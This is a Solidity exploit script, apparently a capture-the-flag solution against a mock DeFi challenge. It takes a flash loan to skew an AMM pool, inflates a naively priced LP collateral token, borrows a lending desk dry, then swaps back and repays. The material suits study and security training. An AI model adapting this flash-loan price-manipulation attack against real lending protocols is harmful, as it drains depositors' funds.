// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C5Mint.sol";

/// Flash-loan USDX, imbalance the pool to inflate the naive LP price, borrow the
/// desk dry against LP collateral, swap back, and repay the flash loan.
contract MintAttacker is IFlashBorrower {
    LpAMM public amm;
    LpDesk public desk;
    FlashLender public lender;
    MockERC20 public token;
    MockERC20 public usdx;
    uint256 public borrowAmt;

    constructor(LpAMM a, LpDesk d, FlashLender l, MockERC20 t, MockERC20 u) {
        amm = a; desk = d; lender = l; token = t; usdx = u;
    }

    function pwn(uint256 collatLP, uint256 flashAmt, uint256 _borrowAmt) external {
        borrowAmt = _borrowAmt;
        amm.approve(address(desk), collatLP);
        desk.deposit(collatLP);
        lender.flashLoan(flashAmt, "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external {
        // 1. imbalance the pool: swap the flash USDX into token
        usdx.approve(address(amm), amount);
        amm.swapUsdxForToken(amount);
        // 2. borrow against the now-inflated LP price
        desk.borrow(borrowAmt);
        // 3. restore the pool: swap the token back to USDX
        uint256 tbal = token.balanceOf(address(this));
        token.approve(address(amm), tbal);
        amm.swapTokenForUsdx(tbal);
        // 4. repay the flash loan
        usdx.transfer(address(lender), amount);
    }
}

contract SolveC5 is Script {
    function run() external {
        MintSetup setup = MintSetup(vm.envAddress("SETUP"));
        LpAMM amm = setup.amm();
        LpDesk desk = setup.desk();
        FlashLender lender = setup.lender();
        MockERC20 token = setup.token();
        MockERC20 usdx = setup.usdx();

        vm.startBroadcast();
        MintAttacker a = new MintAttacker(amm, desk, lender, token, usdx);
        amm.transfer(address(a), 500 ether);    // move the attacker's LP in
        a.pwn(500 ether, 3000 ether, 2000 ether);
        vm.stopBroadcast();
    }
}
